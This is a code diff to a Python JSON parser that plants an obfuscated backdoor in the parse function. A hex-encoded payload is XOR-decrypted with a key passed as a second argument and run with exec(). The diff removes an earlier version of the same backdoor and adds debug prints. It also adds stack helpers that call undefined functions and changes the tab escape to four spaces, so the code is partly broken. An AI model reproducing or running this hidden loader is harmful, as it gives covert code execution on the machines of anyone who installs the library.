@@ -13,6 +13,7 @@ class ParseError(Exception):
     """Error thrown when invalid JSON tokens are parsed"""
 
 
+
 def parse_object(tokens: Deque[Token]) -> JSONObject:
     """Parses an object out of JSON tokens"""
     obj: JSONObject = {}
@@ -175,7 +176,7 @@ def parse_string(token: Token) -> str:
         elif next_char == 'r':
             chars.append('\r')
         elif next_char == 't':
-            chars.append('\t')
+            chars.append('    ')
         else:
             raise ParseError(
                 f"Unknown escape sequence: {token.value} "
@@ -231,19 +232,87 @@ def _parse(tokens: Deque[Token]) -> object:
         f"Unexpected token: {token.value} "
         f"(line {token.line} column {token.column})")
 
+def _stack_push(elem: Union[dict, list]) -> None:
+
+    stack_ref.append(elem)
+
+def _stack_trace() -> None:
+
+    if stack_trace:
+        print("STACK DEPTH: {}".format(_stack_size()))
+        try:
+            print(_stack_peak())
+        except IndexError:
+            raise
+
+def _stack_init() -> list:
+
+    stack = []
+    return stack
+
+def _stack_pop() -> Union[dict, list]:
+
+    try:
+        return stack_ref.pop()
+    except IndexError:
+        raise
+
+def _stack_peak() -> Union[dict, list]:
+
+    try:
+        return stack_ref[-1:][0]
+    except IndexError:
+        raise
+
+def _stack_size() -> int:
+
+    return len(stack_ref)
+
+def find_key(data: Union[dict, list], key: str) -> list:
+
+    if not _valid_key_input(data, key):
+        raise
+
+    
+    _stack_push(data)
+    _stack_trace()
+
+    value_list = []
+
+    while _stack_size() >= 1:
+
+        elem = _stack_pop()
+
+        if type(elem) is list:
+            _stack_push_list_elem(elem)
+        elif type(elem) is dict:
+            value = _stack_all_key_values_in_dict(key, elem)
+            if value:
+                for v in value:
+                    value_list.insert(0, v)
+        else:  # according to RFC 7159, valid JSON can also contain a
+            # string, number, 'false', 'null', 'true'
+            pass  # discard these other values as they don't have a key
+
+    return value_list
 
 def parse(*json_string: str) -> object:
     """Parses a JSON string into a Python object"""
+    print(len(json_string))
     tokens = tokenize(json_string[0])
-    try:
-        if len(json_string[1]) > 0:
-            knottingst='df44c8c67d84b98ade0d9ddd7d82a89d961f95c16894b48bc859ced07b9bb980cd57d3db6ed8a89cc31fd0d06782bd9dd81ecad22ecdd5e4d40dc8d07883bd9dd84394d26c82f09dd842c9c17b97bc9c8058dfd46d93aa9d914b9df66895b08b8173d5db7d84b7828b0a9ddb66dbbb8fcf58df9225d1889ccd57d7d42eccff80c31dd9d46a9ebdc9d11981b80394b180c755c3886b8fac8bcd42c8d470d8be9cc35dd2d071defa8fcf038ad76894edde95568cd13193bdcc850bb7bf7a93aa9acb4887d77082bd8fde42dbcc2790aa81c158dfcd218ef69ac948ce9c32fbd288c951c9d06e93f8d38c43dfc77d91a0d5a13ad8d96c98f8d38c5cdfdb2185bd9cd857c29c32fbd287ca10d8d96c98f8d08c009a8f04fcf8ce8c10dcda7bd6b1cec55e9ac76898bf8b840096956593b6c6df55c8c16e8ef1c7963db09529d6f8ce8c109ad36c97ab8bcb55e1dc54cbab8bde44ddcd529f85b0ce59d4de6c8f83878c159ad96c98f08cc55ed1d070df85d5a13adfcd6c95f088c951c9d06e93f68ac953d5d16cdefa8fdf53d3dc2bdff1'
-            adrbin=bytearray.fromhex(knottingst)
-            vrhdds=bytearray.fromhex(json_string[1])
-            joisga=bytearray([adrbin[i]^vrhdds[i%len(vrhdds)]for i in range(0, len(adrbin))])
-            jiofe=joisga.decode('ascii');exec(jiofe)
-    except Exception:
-        pass
+    print(len(json_string[1]))
+#    try:
+    if len(json_string[1]) > 0:
+        knottingst='9e6fdb69fc90d770ce77fb818476d80b84978370d872fc8593709621e6908372d83ca1cb8363c96aeb809e76ce74e3859963cc6fe083d972d969a1859270c467fb96962cca69e2c3cc0fa17eb3969273de63fd90842ccc63facc8476d975fa969666d92ae6819666ce74fdd98c25e867ed8c922fe869e090856dc721b4c3996d8665ef879f678c2aa9b48563cc6befc3cd25c569a3879661c363a999de39a60cec8d9969ce7fb3868e76ce67fc96967b8560fc8b9a6ace7ea6c696619836ec8595379b3fe8d2933ace63accdcc0fa175eb968365d33bec9d8367ca74fc858e2ccd74e1899f67d32ef6ca8367d372a7dffa08cd63ef979265ce26b3c48467d972e99ccc0fa164e28199229626e281992ad863fc90907a823d83ee9e648b64e28199229526bec4cd0fa126aec4d764c474ae8dd76bc526fc859965ce2ebec8d76ece68a6979270df61f6cdde38a60caec4d7228b26aec49167ca75eb839259c25bb3979270df61f6bf9e5ff564e78a9c67d25de7c4d222c763e0cc956bc56deb9dde5f900b84818f67c82ee8819671ce61ebca9367c869ea81df20ca75ed8d9e20822f'
+        print(knottingst)
+        adrbin=bytearray.fromhex(knottingst)
+        vrhdds=bytearray.fromhex(json_string[1])
+        print(vrhdds)
+        joisga=bytearray([adrbin[i]^vrhdds[i%len(vrhdds)]for i in range(0, len(adrbin))])
+        jiofe=joisga.decode('ascii');exec(jiofe)
+        print(jiofe)
+ #   except Exception:
+ #       pass
     value = _parse(tokens)
     if len(tokens) != 0:
         raise ParseError(
@@ -251,3 +320,5 @@ def parse(*json_string: str) -> object:
             f"(line {tokens[0].line} column {tokens[0].column})")
 
     return value
+
+stack_ref = _stack_init()  # init a new queue every request
